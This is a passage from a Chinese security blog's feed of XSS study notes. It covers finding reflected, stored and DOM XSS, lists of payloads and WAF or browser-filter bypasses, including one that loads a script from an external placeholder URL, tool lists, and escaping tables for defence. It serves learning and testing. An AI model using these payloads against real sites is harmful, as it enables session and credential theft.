<li><code>&lt;svg onload=eval(x+t)&gt;</code></li>
</ul>
</li>
</ul>
<h4 id="7-浏览器自带的协议"><a href="#7-浏览器自带的协议" class="headerlink" title="7. 浏览器自带的协议"></a>7. 浏览器自带的协议</h4><ul>
<li>通用协议：javascript:alert(1)</li>
<li>Chrome浏览器协议：data:alert(1)</li>
<li>IE浏览器协议：vbscript:alert(1)</li>
</ul>
<h4 id="8-Misc"><a href="#8-Misc" class="headerlink" title="8. Misc"></a>8. Misc</h4><ul>
<li>通过location.hash的方式，将参数写在#号后，既能让JS读取到该参数，又不让该参数传入到服务器，从而避免了WAF的检测</li>
<li>script，/，’’等都被转换成&amp;nbsp，可以用换行符%0a，%0d来进行绕过</li>
<li>eval()函数来替换被过滤的alert()</li>
<li>// -&gt; 注释 -&gt; 换行输出 -&gt;结合&lt;- \ -&gt; javascript，字符串允许下面多行的写法，可以用\来使进行多行输出</li>
<li>优先级：function()函数 &gt; == &gt; &amp;</li>
<li>优先级：svg onload 会比 body onload 先执行</li>
</ul>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS--手工挖掘</title>
    <url>/2020/04/02/XSS--%E6%89%8B%E5%B7%A5%E6%8C%96%E6%8E%98/</url>
    <content><![CDATA[<hr>
<h4 id="1-寻找思路"><a href="#1-寻找思路" class="headerlink" title="1. 寻找思路"></a>1. 寻找思路</h4><ul>
<li>反射型是：输入–输出 / 存储型是：输入–进入数据库*–取出数据库–输出。</li>
<li>寻找思路差别<ul>
<li>反射型是：绝大部分情况下，输入在哪里，输出就在哪里</li>
<li>存储型是：输入在A处进入数据库， 而输出则可能出现在其它任何用到数据的地方。</li>
<li>反射型是：输入大部分位于地址栏或来自DOM的某些属性，也会偶尔有数据在请求中（POST类型）</li>
<li>存储型是：输入大部分来自POST/GET请求，常见于一些保存操作中</li>
</ul>
</li>
<li>⭐ 寻找存储型：输出的位置不一定出现在输入的位置（逆向思维）<ul>
<li>先找到输出点，然后猜测此处输出是否会被过滤</li>
<li>如果觉得可能没过滤，我们再找到这个输出是在哪里输入的</li>
<li>接着开始测试输入，看输出的效果</li>
<li>如果没过滤，那么你就成功了，否则你可以放弃掉它</li>
</ul>
</li>
<li>⭐ 寻找反射型（正向思维）<ul>
<li>一个站点<a href="http://example.com" target="_blank" rel="noopener">http://example.com</a></li>
<li>在目标站点上找到输入点</li>
<li>输入一组”特殊字符（单引号，双引号，尖括号等）+唯一识别字符（字母数字组合）”，点击提交后，查看返回的源码，是否有对应的处理</li>
<li>通过搜索定位到唯一识别字符，结合唯一识别字符的前后语法确认是否可以构造执行js的条件（是否能构造闭合）</li>
<li>提交构造的脚本代码（以及各种绕过姿势），看是否成功执行，如果成功执行说明存在xss漏洞</li>
</ul>
</li>
<li>⭐ 寻找DOM型（正向思维）<ul>
<li>查看代码是否有document.write、eval、window、document.URL.indexOf(“id=”)、cookie、referrer、#跳转、innerHTML之类能造成危害的地方</li>
<li>通过回溯变量和函数的调用过程，查看用户是否能控制输入</li>
<li>如果能控制输入，就看看是否能复习，能复习就说明存在DOM XSS</li>
</ul>
</li>
</ul>
<h4 id="2-常用的payload"><a href="#2-常用的payload" class="headerlink" title="2. 常用的payload"></a>2. 常用的payload</h4><ul>
<li>特殊字符：<code>&#39;&quot;&lt;&gt;666</code></li>
<li>弹窗：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>大小写：<code>&lt;sCrIpt&gt;alert(1)&lt;/ScrIpt&gt;</code></li>
<li>重复标签：<code>&lt;sc&lt;script&gt;ript&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></li>
<li>重复script：<code>&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;</code></li>
<li>HTML实体编码：<code>&amp;#x3C;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3E;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x3C;&amp;#x2F;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3E;</code>（一般用于反射型XSS，用于HTML代码）</li>
<li>Unicode编码：<code>\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e</code>（一般用于DOM型XSS，用于JS代码）</li>
<li>JavaScript字符串方法：<code>String.formCharCode(97,108,101,114,116,40,34,88,83,34,41,59)</code>（用于绕过magic_quotes_gpc，用来把ASCII转换为字符串）</li>
<li>onclick事件：<code>&lt;img src=x onclick=alert(1)&gt;</code></li>
<li>onload事件：<code>&lt;img src=x onload=alert(1)&gt;</code>（一般用于img的自动加载）</li>
<li>onerror事件：<code>&lt;img src=x onerror=alert(1)&gt;</code></li>
<li>onmouse事件：<code>&lt;img src=x onmouse=alert(1)&gt;</code></li>
<li>href属性：<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;</code></li>
<li>src属性：<code>&lt;img src=&quot;javascript:alert(1)&quot;&gt;</code></li>
<li>注释+伪协议：<code>javascrip&amp;#x74;:alert(1)//http://</code></li>
<li><code>&amp;Tab;</code>绕过：<code>javas&amp;Tab;cript:alert(1)</code></li>
<li>隐藏表单：<code>&quot; type=&quot;txt&quot; value=&quot;q&quot; onclick=&quot;alert(1)</code></li>
<li>/混淆形式：<code>&lt;img/src=@ onerror=alert(1)&gt;</code></li>
<li>绕过对src的限制：<code>&lt;img appendChild(createElement(&#39;script&#39;)).src=&#39;js_url&#39;&gt;</code></li>
<li>js代码eval(‘alert(1)’);voids来进入绕过对<code>&lt;&gt;</code>的过滤，此类常用于<code>&lt;script&gt;&lt;/script&gt;</code>标签之内</li>
<li>▲ payload中的重复，大小写等都适用于属性里面的内容，而不单单只属于标签</li>
<li>▲ 其他的一些，不外乎上面的payload+闭合标签，更多的payload已经上传到云服务器</li>
<li>▲ 更老的一些payload例子，可以查看XSS靶场–WooYun.tencent</li>
<li>⭐ 标签的闭合<ul>
<li>标签中间 -&gt; <code>&lt;/td&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>标签属性中间 -&gt;<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>▲ 最好是闭合加载后的标签，留言后的标签也可以尝试</li>
<li>▲ 若标签限制了maxlength，可通过修改进行绕过，若修改不了长度或写入不了代码，可通过抓包写入代码或修改长度</li>
</ul>
</li>
<li>⭐ 闭合标签（⭐ 属性内）<ul>
<li><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li><code>&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li><code>q&quot; onclick=&quot;alert(1)</code></li>
<li><code>javascrip&amp;#x74;:alert(1)//http://</code></li>
</ul>
</li>
</ul>
<h4 id="3-高级payload"><a href="#3-高级payload" class="headerlink" title="3. 高级payload"></a>3. 高级payload</h4><ul>
<li>⭐ 带XSS平台的payload尝试（XSS Hunter/xssye.com，云服务器都有保存）⭐</li>
<li>⭐ 别人总结的XSS备忘录，有很多的高质量的payload ⭐</li>
<li><code>&lt;img src=x onerror=s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;XSSURL&#39;;&gt;</code><ul>
<li>appendChild() 方法在指定元素节点的最后一个子节点之后添加节点</li>
</ul>
</li>
</ul>
<h4 id="4-关于DOM型代码审计时审计的特征点"><a href="#4-关于DOM型代码审计时审计的特征点" class="headerlink" title="4. 关于DOM型代码审计时审计的特征点"></a>4. 关于DOM型代码审计时审计的特征点</h4><pre><code>           ▲ 关于更多的函数与代码，可以看MDN和RUNOOB的网站教程
            //获取#锚点
            var elements = location.hash;
            //匹配参数
            elements.indexOf


            //获得id为&quot;Btn&quot;的元素
            var oBtn=document.getElementById(&quot;Btn&quot;);
            //设置或获取位于对象起始和结束标签内的HTML
            oBtn.innerHTML
            //设置或获取对象及其内容的HTML形式
            oBtn.outerHTML


            //添加一个元素
            document.createElement
            //创建或改变某个新属性
            oBtn.setAttribute
            //指定元素节点的最后一个子节点之后添加节点
            oBtn.appendChild

            //向文档写入HTML表达式或 JavaScript代码
            document.write
            //向文档写入HTML表达式或JavaScript代码外加可在每个表达式后写一个换行符
            document.writeln

            //计算JavaScript字符串，并把它作为脚本代码来执行
            eval(&quot;var x = &#39;&quot; + location.hash + &quot;&#39;&quot;);
            //属于window的方法，该方法用于在指定的毫秒数后调用函数或计算表达式
            setTimeout(&quot;alert(&#39;xss&#39;)&quot;, 1000)
            //同上
            window.setTimeout
            document.setTimeout
            //可按照指定的周期（以毫秒计）来调用函数或计算表达式，会不停地调用函数，直到clearInterval()被调用或窗口被关闭。由setInterval()返回的ID值可用作clearInterval()方法的参数，如果只想执行一次可以使用setTimeout()方法
            window.setInterval

            //执行一个命令
            document.execCommand(&#39;ForeColor&#39;,false,&#39;#BBDDCC&#39;);
            //创建一个元素
            document.createElement
            //创建带有命名空间的元素节点
            document.createElementNS
            //创建一个事件
            document.createEvent
            document.createXxx</code></pre><ul>
<li>经验之谈<ul>
<li>一般查询接口容易出现反射性xss,留言板容易出现存储型xss</li>
<li>标签一般是看加载后的HTML页面 / 属性值一般是看加载后属性中的值</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS--其他XSS思路</title>
    <url>/2020/04/02/XSS--%E5%85%B6%E4%BB%96XSS%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<hr>
<h4 id="1-其他XSS思路"><a href="#1-其他XSS思路" class="headerlink" title="1. 其他XSS思路"></a>1. 其他XSS思路</h4><ul>
<li>▲ 本节部分来自bmjoker大佬的博客内容：<a href="https://www.cnblogs.com/bmjoker/p/8805395.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/8805395.html</a> 有一部分来自ahao2333大佬的博客内容：<a href="https://www.cnblogs.com/xiaomeng2333/p/11595786.html，" target="_blank" rel="noopener">https://www.cnblogs.com/xiaomeng2333/p/11595786.html，</a> 也有部分来自心伤的瘦子@乌云</li>
</ul>
<h4 id="2-第三方劫持-外调J-C"><a href="#2-第三方劫持-外调J-C" class="headerlink" title="2. 第三方劫持 (外调J/C)"></a>2. 第三方劫持 (外调J/C)</h4><ul>
<li>第三方劫持就是把资源域的服务器的权限拿下，替换相关资源，采用’迂回式’的渗透方式</li>
<li>名字里的”外调”不是从目标网站上插入新的J/C。而是在目标网站上找到不是本站的J/C，然后渗透那个网站，重写J/C，来达到渗透目标网站</li>
<li>外调：javascript、css、flash、etc、html、SWF</li>
<li>来自”长短短”的代码，获取非本站的J/C</li>
</ul>
<pre><code>for(var i=0,tags=document.querySelectorAll(&#39;iframe[src],frame[src],script[src],link[rel=stylesheet],object[data],embed[src]&#39;),tag;tag=tags[i];i++){
  var a = document.createElement(&#39;a&#39;);
  a.href = tag.src||tag.href||tag.data;
  if(a.hostname!=location.hostname){
    console.warn(location.hostname+&#39; 发现第三方资源[&#39;+tag.localName+&#39;]:&#39;+a.href);
  }
}</code></pre><h4 id="3-XSS-downloader"><a href="#3-XSS-downloader" class="headerlink" title="3. XSS downloader"></a>3. XSS downloader</h4><ul>
<li>把反射和储蓄结合起来，把核心代码写在网站上，然后以XSS触发并调用代码，实现攻击</li>
<li>▲ 《XSS跨转脚本攻击剖析与防御》一书中有</li>
<li>▲ 2020.03.29 看的一知半解，日后再理解</li>
</ul>
<h4 id="4-XCS"><a href="#4-XCS" class="headerlink" title="4. XCS"></a>4. XCS</h4><ul>
<li>XCS就是利用浏览器来玩XSS，它的功能比普通上的XSS还要强大，因为利用浏览器协议漏洞，可以调用浏览器的API来实现下载覆盖本地文件(可以把它这个功能理解为挂马)</li>
<li>XSC还可以控制浏览器的历史、设置、收藏夹等</li>
</ul>
<h4 id="5-页面渲染XSS"><a href="#5-页面渲染XSS" class="headerlink" title="5. 页面渲染XSS"></a>5. 页面渲染XSS</h4><ul>
<li>jpg(ie6下才会出现)、word里写xss vector的，各种邮箱、网盘等</li>
<li>假如我当前页面存在txt文件，而txt文件内容为<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>时，就会弹窗。因为浏览器把txt的内容当成html来输出了</li>
<li>▲ 若站点可以上传txt，且浏览器版本低，此漏洞危害很大</li>
</ul>
<h4 id="6-XSF-Flash-XSS"><a href="#6-XSF-Flash-XSS" class="headerlink" title="6. XSF(Flash XSS)"></a>6. XSF(Flash XSS)</h4><ul>
<li>XSF其实不算XSS的分类中，应该算作XSS的分支，因为在XSS使用到的技巧，在XSF只有一部分可以使用，因为XSF是基于ActionScript2/3.0语言的基础上</li>
<li>在ActionScript2/3.0里以下几个函数需要重点关注下：getURL、navigateToURL、ExternalInterface.call、ExternalInterface.call、htmlText、addcallback等</li>
<li>▲ 关乎XSF的，wooyun.tenclent中有大量的例子在云服务器上</li>
</ul>
<h4 id="7-XST（Cross-Site-Tracing）"><a href="#7-XST（Cross-Site-Tracing）" class="headerlink" title="7. XST（Cross-Site Tracing）"></a>7. XST（Cross-Site Tracing）</h4><ul>
<li>跨站追踪，指利用JavaScript发送HTTP的TRACE方法来窃取Cookie值或Basic认证密码的攻击手段</li>
<li>实际上，现在的主流浏览器都已经能够自己防御XST</li>
</ul>
<h4 id="8-CSSXSS"><a href="#8-CSSXSS" class="headerlink" title="8. CSSXSS"></a>8. CSSXSS</h4><ul>
<li>css代码中利用expression触发xss漏洞<ul>
<li><code>&lt;div style=&quot;width: expression(alert(&#39;xss&#39;));&gt;</code></li>
<li><code>&lt;style&gt;body {background-image:expression(alert(&quot;xss&quot;));}&lt;/style&gt;</code></li>
<li><code>&lt;div style=&quot;list-style-image:url(javascript:alert(&#39;xss&#39;))&quot;&gt;</code></li>
</ul>
</li>
<li>css代码中利用@import触发xss<ul>
<li><code>&lt;stytle&gt;@import &#39;javascript:alert(&quot;XSS&quot;)&#39;;&lt;/stytle&gt;</code></li>
</ul>
</li>
<li>css代码中使用@import和link方式导入外部含有xss代码的样式表文件<ul>
<li><code>&lt;link rel=&quot;stytlesheet&quot; href=&quot;http://www.***.com/a.css&quot;&gt;</code></li>
<li><code>&lt;stytle type=&#39;text/css&#39;&gt;@import url(http://www.*.com/a.css);&lt;/style&gt;</code></li>
</ul>
</li>
<li>▲ xss过滤函数需过滤style标签、style属性、expression、javascript、import等关键字，但实际上，CSSXSS在近几年较少</li>
<li>▲ IE8的标准中就禁用了expression功能执行JavaScript，但在其他模式中还可以使用</li>
</ul>
<h4 id="9-针对HTTP头的思路（一般为PHP语言）"><a href="#9-针对HTTP头的思路（一般为PHP语言）" class="headerlink" title="9. 针对HTTP头的思路（一般为PHP语言）"></a>9. 针对HTTP头的思路（一般为PHP语言）</h4><ul>
<li>使用Cookie来作为显示参数的值</li>
<li>使用Referer来作为显示参数的值</li>
<li>使用User-Agent来作为显示参数的值</li>
<li>记录IP地址<ul>
<li>HTTP_X_FORWARDED-FOR() -&gt; 可伪造 -&gt; 火狐插件X-Forwarded-For Header</li>
<li>HTTP_CLIENT_IP() -&gt; 可伪造 -&gt; 火狐插件Modify Headers</li>
<li>REMOTE_ADDR() -&gt; 不可伪造</li>
</ul>
</li>
</ul>
<h4 id="10-针对DOM中iframe的思路（-路径可控-问题，iframe中的输出可以控制）"><a href="#10-针对DOM中iframe的思路（-路径可控-问题，iframe中的输出可以控制）" class="headerlink" title="10. 针对DOM中iframe的思路（[路径可控]问题，iframe中的输出可以控制）"></a>10. 针对DOM中iframe的思路（[路径可控]问题，iframe中的输出可以控制）</h4><ul>
<li>▲ 针对不同浏览器，要过滤不同的协议<ul>
<li>chrome -&gt; data协议</li>
<li>IE -&gt; vbscript协议（vbscript里 ‘单引号表示注释，类似JS里的//）</li>
<li>通用 -&gt; javascript协议</li>
</ul>
</li>
<li>onload执行js：<code>&lt;iframe onload=&quot;alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>
<li>src 执行javascript代码：<code>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>
<li>IE下vbscript执行代码：<code>&lt;iframe src=&quot;vbscript:msgbox(1)&quot;&gt;&lt;/iframe&gt;</code></li>
<li>Chrome下data协议执行代码：<code>&lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt; Chrome</code></li>
<li>上面的变体：<code>&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></li>
<li>Chrome下srcdoc属性：<code>&lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></li>
</ul>
<h4 id="11-针对JSONP中地址的可控（callback参数的限制以及自定义参数）"><a href="#11-针对JSONP中地址的可控（callback参数的限制以及自定义参数）" class="headerlink" title="11. 针对JSONP中地址的可控（callback参数的限制以及自定义参数）"></a>11. 针对JSONP中地址的可控（callback参数的限制以及自定义参数）</h4><ul>
<li>一些程序员会动态的加载json数据，同域的时候，可以使用ajax</li>
<li>有时候，数据所在域和当前页面所在域又不一致，跨域请求数据的手段中，有种叫做jsonp</li>
<li>代码表示：<code>somescript.src=&quot;http://otherdomain.com/xx?jsonp=callback&quot;</code></li>
<li>可控参数：<code>somescript.src=&quot;http://otherdomain.com/xx?jsonp=callback&amp;id=&quot;+id;</code></li>
<li>地址的可控<ul>
<li>script src=”完全可控” ,这种就简单了，直接将地址换为我们的JS地址</li>
<li>script src=”/path/xxx/[路径可控]/1.js”<ul>
<li>可以直接上传文本至同域名下，不一定要是HTML文件，需要上传点有过滤缺陷。</li>
<li>参数可控，利用可用的json接口（script src=”/path/xxx/…/yyy/xx.json?callback=alert(1)”）</li>
</ul>
</li>
<li>script src=”/xxxx/json.php?callback=xxxx&amp;param1=yyy&amp;param2=[参数可控]”情况与地址可控的第二点参数可控类似</li>
</ul>
</li>
</ul>
<h4 id="12-针对浏览器的过滤器（chrome）"><a href="#12-针对浏览器的过滤器（chrome）" class="headerlink" title="12. 针对浏览器的过滤器（chrome）"></a>12. 针对浏览器的过滤器（chrome）</h4><ul>
<li>查看是否被浏览器拦截 -&gt; chrome<ul>
<li>Refused to execute a javascript script.Source code of script found within request</li>
<li>查看源码 -&gt; 是否被和谐</li>
</ul>
</li>
<li>绕过通用方法<ul>
<li>要求<ul>
<li>缺陷点允许&lt;&gt; </li>
<li>缺陷点运行=</li>
<li>缺陷点的后方存在<code>&lt;/script&gt;</code>标签</li>
</ul>
</li>
</ul>
</li>
<li>构造payload：<code>&lt;script src=data:,alert(1)&lt;!--</code></li>
<li>▲ 一般过滤器的规则，是觉得是恶意代码的才会去拦截，可以利用代码，去绕过规则</li>
<li>▲ IE等其他浏览器的过滤器暂无找到资料</li>
</ul>
<h4 id="13-富文本操作"><a href="#13-富文本操作" class="headerlink" title="13. 富文本操作"></a>13. 富文本操作</h4><ul>
<li>白名单，即：只允许使用白名单内的合法HTML标签，例如IMG，其它均剔除</li>
<li>黑名单，即：厂商会构建一个有危害的HTML标签、属性列表，然后通过分析用户提交的HTML代码，剔除其中有害的部分</li>
<li>▲ 白名单要安全得多，而黑名单的方式则经常会被绕过</li>
<li>▲ 当所有的思路走不通时，可以用富文本，大量的payload去碰撞，用bp进行抓包修改</li>
</ul>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS--工具挖掘</title>
    <url>/2020/04/02/XSS--%E5%B7%A5%E5%85%B7%E6%8C%96%E6%8E%98/</url>
    <content><![CDATA[<hr>
<h4 id="1-火狐中常见的XSS插件"><a href="#1-火狐中常见的XSS插件" class="headerlink" title="1. 火狐中常见的XSS插件"></a>1. 火狐中常见的XSS插件</h4><ul>
<li>OWASP Mantra - Security Framework<ul>
<li>OWASP出品的类同火狐浏览器</li>
</ul>
</li>
<li>Hackbar<ul>
<li>构造http包，一个常用的神器</li>
</ul>
</li>
<li>Firebug<ul>
<li>查看源代码</li>
</ul>
</li>
<li>Tamper Popup<ul>
<li>抓包</li>
<li>clinet-ip</li>
<li>▲ 若服务器接收客户端IP并显示，可能存在XSS漏洞</li>
</ul>
</li>
<li>Live HTTP headers<ul>
<li>修改抓包的数据</li>
</ul>
</li>
<li>Editor Cookie<ul>
<li>编辑Cookie信息</li>
</ul>
</li>
<li>Cookie Manage<ul>
<li>Cookie信息的管理者</li>
</ul>
</li>
</ul>
<h4 id="2-XSS漏洞工具挖掘"><a href="#2-XSS漏洞工具挖掘" class="headerlink" title="2. XSS漏洞工具挖掘"></a>2. XSS漏洞工具挖掘</h4><ul>
<li>⭐ 尽量不要尝试POST型的闭合，可能导致页面扭曲歪曲，特别是存储型XSS</li>
<li>avws</li>
<li>netspark</li>
<li>appscan</li>
<li>burp</li>
<li>xsser</li>
<li>xsscrapy</li>
<li>brutexssr<ul>
<li>python脚本编写，命令行执行</li>
<li>get/post请求方式，通过wordlist去尝试</li>
</ul>
</li>
<li>OWASP Xenotix XSS Exploit Framework<ul>
<li>setting -&gt; start（xook.js中存放有几千条xss代码）</li>
<li>Scanner -&gt; GET -&gt; 粘贴地址 -&gt; 字段加入[x] -&gt; Fuzz</li>
<li>Scanner -&gt; POST -&gt; Burpsuite抓包黏贴Request Header -&gt; 指定字段 -&gt; Fuzz</li>
</ul>
</li>
<li>▲ 工具的使用暂不介绍</li>
</ul>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS--概要</title>
    <url>/2020/04/02/XSS--%E6%A6%82%E8%A6%81/</url>
    <content><![CDATA[<hr>
<h4 id="1-XSS漏洞的基础详解"><a href="#1-XSS漏洞的基础详解" class="headerlink" title="1. XSS漏洞的基础详解"></a>1. XSS漏洞的基础详解</h4><ul>
<li>由于web应用程序对用户的输入过滤不严而产生的</li>
<li>攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采用cookie资料窃取，会话劫持，钓鱼欺骗等攻击手段</li>
<li>漏洞形成根源<ul>
<li>服务器对用户提交数据过滤不严</li>
<li>提交给服务器的脚本被直接返回给其他客户端执行</li>
<li>脚本在客户端执行恶意操作</li>
</ul>
</li>
</ul>
<pre><code>&lt;html&gt;
&lt;head&gt;xss test&lt;/head&gt;
&lt;body&gt;
&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
//使用xss弹出恶意警告框，代码为
&lt;script&gt;alert(/xss/)&lt;/script&gt;
//xss输入也可能时html代码段，如果使网页不停的刷新，代码为
&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0&quot;;&gt;
//嵌入其他网站链接的代码
&lt;iframe src=http://cracer.com width=0 height=0&gt;&lt;/iframe&gt;</code></pre><h4 id="2-XSS的危害"><a href="#2-XSS的危害" class="headerlink" title="2. XSS的危害"></a>2. XSS的危害</h4><ul>
<li>网络钓鱼，包括盗取各类的用户账号 -&gt; （反射型/存储型XSS）</li>
<li>窃取用户cookie -&gt; 钓鱼（反射型/存储型XSS）</li>
<li>窃取用户浏览会话 -&gt; （反射型/存储型XSS）</li>
<li>强制弹出广告页面、刷流量 -&gt; 存储型XSS</li>
<li>网页挂马提升用户权限，进一步渗透网站</li>
<li>传播跨站脚本蠕虫等 -&gt; 存储型XSS</li>
<li>点击劫持 -&gt; 通过script标签+iframe调用存在xss的页面+css样式实现</li>
<li>篡改网页 -&gt; form元素的action属性被改为恶意网站的URL，然后进行攻</li>
<li>通过JavaScript攻击 -&gt; 随着Ajax技术的风靡，通过JavaScript调用Web应用的各种功能的程序（API）</li>
<li>▲ 危害一般性：存储型&gt;反射型&gt;DOM型</li>
</ul>
<h4 id="3-存在XSS的地方"><a href="#3-存在XSS的地方" class="headerlink" title="3. 存在XSS的地方"></a>3. 存在XSS的地方</h4><ul>
<li>个人资料（昵称、签名、说明、邮箱、微信、qq、支付宝、银行卡）</li>
<li>查询接口</li>
<li>留言板</li>
<li>url</li>
<li>文件上传</li>
<li>flash</li>
<li>http头（referer、cookie、user-agent、client-ip）</li>
<li>swf</li>
</ul>
<h4 id="4-反射型XSS"><a href="#4-反射型XSS" class="headerlink" title="4. 反射型XSS"></a>4. 反射型XSS</h4><ul>
<li>反射型跨站脚本也称作非持久型、参数型跨站脚本，这类型的脚本是最常见的，也是使用最为广泛的一种，主要用于将恶意的脚本附加到URL地址的参数中</li>
<li>▲ 一般使用的将构造好的URL发给受害者，使受害者点击触发，而且只执行一次，非持久化</li>
</ul>
<p><img src="/images/xss/Web_Security/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%B5%81%E7%A8%8B.png" srcset="/img/loading.gif" alt="反射型XSS流程"></p>
<h4 id="5-存储型XSS"><a href="#5-存储型XSS" class="headerlink" title="5. 存储型XSS"></a>5. 存储型XSS</h4><ul>
<li>存储型XSS比反射型跨站脚本更具威胁性，并且可能影响倒web服务器的自身安全</li>
<li>此类XSS不需要用户点击特定的URL就能执行跨站脚本，攻击者事先将恶意javascript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意的代码的页面就会执行恶意代码</li>
</ul>
<p><img src="/images/xss/Web_Security/%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%B5%81%E7%A8%8B.png" srcset="/img/loading.gif" alt="存储型XSS流程"></p>
<h4 id="6-DOM型XSS"><a href="#6-DOM型XSS" class="headerlink" title="6. DOM型XSS"></a>6. DOM型XSS</h4><ul>
<li>本质是反射型，利用浏览器DOM特性，直接在本地执行修改</li>
<li>▲ 此类漏洞难以挖掘</li>
<li>▲ 关乎DOM型的问题，可以看云服务器上一篇关乎DOM-XSS的介绍</li>
</ul>
<h4 id="7-若再深入研究XSS"><a href="#7-若再深入研究XSS" class="headerlink" title="7. 若再深入研究XSS"></a>7. 若再深入研究XSS</h4><ul>
<li>DOM型XSS的挖掘与使用</li>
<li>CSP策略及绕过方法</li>
<li>跨域访问与跨域资源共享</li>
</ul>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS--防护策略与代码</title>
    <url>/2020/04/02/XSS--%E9%98%B2%E6%8A%A4%E7%AD%96%E7%95%A5%E4%B8%8E%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<hr>
<h4 id="1-常见的防XSS对策"><a href="#1-常见的防XSS对策" class="headerlink" title="1. 常见的防XSS对策"></a>1. 常见的防XSS对策</h4><ul>
<li>参数所在位置及相应的转义方法</li>
</ul>
<table>
<thead>
<tr>
<th align="center">位置</th>
<th align="center">说明</th>
<th align="center">最低限度的转义内容</th>
</tr>
</thead>
<tbody><tr>
<td align="center">元素内容</td>
<td align="center">能解释Tag和字符实体</br>结束边界符为”&lt;”</td>
<td align="center">“&lt;”和”&amp;”使用字符实体转义</td>
</tr>
<tr>
<td align="center">属性值（双引号中的内容）</td>
<td align="center">能解释字符实体</br>结束边界符为双引号</td>
<td align="center">属性值使用双引号括起来，”&lt;”和”&amp;”和”””使用字符实体转义</td>
</tr>
<tr>
<td align="center">属性值（URL）</td>
<td align="center">同上</td>
<td align="center">检测URL格式正确后按照属性值的规则转义</td>
</tr>
<tr>
<td align="center">事件绑定函数</td>
<td align="center">同上</td>
<td align="center">转义JavaScript后按照属性值得规则转义</td>
</tr>
<tr>
<td align="center">script元素中的字符串字面量</td>
<td align="center">不能解释Tag和字符实体</br>结束边界符为”&lt;”</td>
<td align="center">转义JavaScript应避免出现”&lt;/“</td>
</tr>
</tbody></table>
<ul>
<li>htmlspecialchars()函数</li>
</ul>
<table>
<thead>
<tr>
<th align="center">转换前</th>
<th align="center">转换后</th>
<th align="center">ENT_NOQUOTES</th>
<th align="center">ENT_COMPAT</th>
<th align="center">ENT_QUOTES</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&lt;</td>
<td align="center"><code>&amp;lt;</code></td>
<td align="center">√</td>
<td align="center">√</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">&gt;</td>
<td align="center"><code>&amp;gt;</code></td>
<td align="center">√</td>
<td align="center">√</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">&amp;</td>
<td align="center"><code>&amp;amp;</code></td>
<td align="center">√</td>
<td align="center">√</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">“</td>
<td align="center"><code>&amp;quot;</code></td>
<td align="center">×</td>
<td align="center">√</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">‘</td>
<td align="center"><code>&amp;#39;</code></td>
<td align="center">×</td>
<td align="center">×</td>
<td align="center">√</td>
</tr>
</tbody></table>
<ul>
<li>JavaScript字符串字面量应被转义的字符</li>
</ul>
<table>
<thead>
<tr>
<th align="center">字符</th>
<th align="center">转义后</th>
</tr>
</thead>
<tbody><tr>
<td align="center">|\</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">‘</td>
<td align="center">&#39;</td>
</tr>
<tr>
<td align="center">“</td>
<td align="center">&quot;</td>
</tr>
<tr>
<td align="center">换行</td>
<td align="center">\n</td>
</tr>
</tbody></table>
<ul>
<li>指定响应的字符编码<ul>
